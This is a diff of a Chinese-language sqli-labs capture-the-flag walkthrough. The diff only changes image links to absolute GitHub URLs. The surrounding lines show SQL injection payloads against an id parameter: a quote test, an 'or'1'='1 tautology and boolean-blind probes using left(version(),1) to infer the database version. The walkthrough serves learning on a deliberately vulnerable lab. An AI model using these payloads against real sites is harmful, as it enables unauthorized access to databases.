@@ -2,13 +2,13 @@
 
 payload:?id=1
 
-![](images/A323A80B77194186988800F35C2096AFclipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/A323A80B77194186988800F35C2096AFclipboard.png)
 
 
 
 payload:?id=1'
 
-![](images/070A2C3D20274D1CA90FDB4235852C65clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/070A2C3D20274D1CA90FDB4235852C65clipboard.png)
 
 
 
@@ -16,7 +16,7 @@ payload:?id=1'
 
 payload:?id=-11'or'1'='1
 
-![](images/EA3FFFA77F2946CAA9097B45DFF48D8Bclipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/EA3FFFA77F2946CAA9097B45DFF48D8Bclipboard.png)
 
 和刚才的页面一样，说明蹴存在注入。
 
@@ -26,10 +26,10 @@ payload:?id=-11'or'1'='1
 
 payload:?id=1'and+left(version(),1)=5--+
 
-![](images/8D7235C1C9A24B03B0ADD1534EA22359clipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/8D7235C1C9A24B03B0ADD1534EA22359clipboard.png)
 
 payload:?id=1'and+left(version(),1)=6--+
 
-![](images/1D4B50325C4E4B4BA30B7A9B19B6E3CAclipboard.png)
+![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/ctf/sql注入深度剖析/sqli_labs通关/basic_challenges（基础挑战）/images/1D4B50325C4E4B4BA30B7A9B19B6E3CAclipboard.png)
 
 此时说明数据库版本为5.几
